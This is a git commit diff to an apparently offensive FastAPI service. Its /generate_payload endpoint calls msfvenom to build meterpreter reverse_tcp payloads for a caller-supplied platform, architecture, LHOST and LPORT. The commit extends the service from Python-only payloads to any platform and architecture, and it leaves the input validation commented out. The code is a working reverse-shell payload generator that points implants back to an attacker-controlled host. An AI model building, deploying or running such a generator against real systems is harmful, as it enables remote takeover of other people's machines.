dd711dd072b71133027e285c9ed64c4ec5c7789f
rocknroll17 <gon1397@naver.com>
2024-12-15 16:58:18 +0900

    feat:Added arch but might gonna be removed...

--- Data/data.py
+++ Data/data.py
@@ -2,5 +2,6 @@ from pydantic import BaseModel
 
 class PayloadInfo(BaseModel):
     platform: str
+    arch: str = None
     LHOST: str
     LPORT: int
--- Router/payload.py
+++ Router/payload.py
@@ -7,9 +7,17 @@ from Data.data import PayloadInfo
 router = APIRouter()
 @router.post("/generate_payload")
 async def generate_payload(info:PayloadInfo):
+    # NO_ARCH_PLATFORM = {"windows","python", "php", "java", "android"}
+    # ARCH_PLATFORM = {"linux"}
+    # x64_ARCH_PLATFORM = {"windows", "osx", "linux"}
+    # if info.platform in NO_ARCH_PLATFORM and info.arch == "x64":
+    #     raise HTTPException(status_code=400, detail=f"Platform {info.platform} does not support architecture specification. Please empty arch variable.")
+    # if not info.arch and info.platform in ARCH_PLATFORM:
+    #     raise HTTPException(status_code=400, detail=f"Platform {info.platform} requires architecture specification. Please specify arch variable.")
+    info.arch = f"/{info.arch}" if info.arch else ""
     command = [
         "msfvenom",
-        "-p", "python/meterpreter/reverse_tcp",
+        "-p", f"{info.platform}{info.arch}/meterpreter/reverse_tcp",
         f"LHOST={info.LHOST}",
         f"LPORT={info.LPORT}",
         "-f", "raw"
@@ -25,5 +33,6 @@ async def generate_payload(info:PayloadInfo):
     except subprocess.CalledProcessError as e:
         raise HTTPException(status_code=500, detail=f"Error: {e.stderr}")
     except Exception as e:
+        print(e)
         raise HTTPException(status_code=500, detail=f"There was an error while generating the payload.")
 
